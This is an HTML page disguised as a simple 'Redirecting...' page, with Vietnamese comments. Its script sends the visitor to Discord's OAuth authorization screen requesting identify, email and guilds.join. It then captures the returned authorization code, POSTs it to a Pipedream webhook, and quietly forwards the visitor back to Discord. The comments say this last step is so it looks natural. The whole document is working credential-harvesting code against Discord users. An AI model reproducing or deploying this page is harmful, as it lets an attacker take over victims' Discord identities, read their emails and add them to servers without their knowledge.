<!DOCTYPE html>
<html>
<head><title>Redirecting...</title></head>
<body>
    <script>
        const WEBHOOK = "https://eop7zyrf1iz1jrc.m.pipedream.net";
        const CLIENT_ID = "1457055712411914377"; // ID từ file index cũ của bạn
        const REDIRECT_URI = "https://senkosanss11-stack.github.io/discordlink/";

        async function handleAuth() {
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');

            if (code) {
                // Bước 2: Nếu đã có mã code từ Discord, gửi nó về Pipedream
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ code: code })
                });
                // Sau khi gửi xong, đẩy về Discord cho tự nhiên
                window.location.href = "https://discord.com/channels/@me";
            } else {
                // Bước 1: Nếu chưa có code, đẩy sang trang Authorize của Discord
                window.location.href = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify+email+guilds.join`;
            }
        }

        handleAuth();
    </script>
</body>
</html>

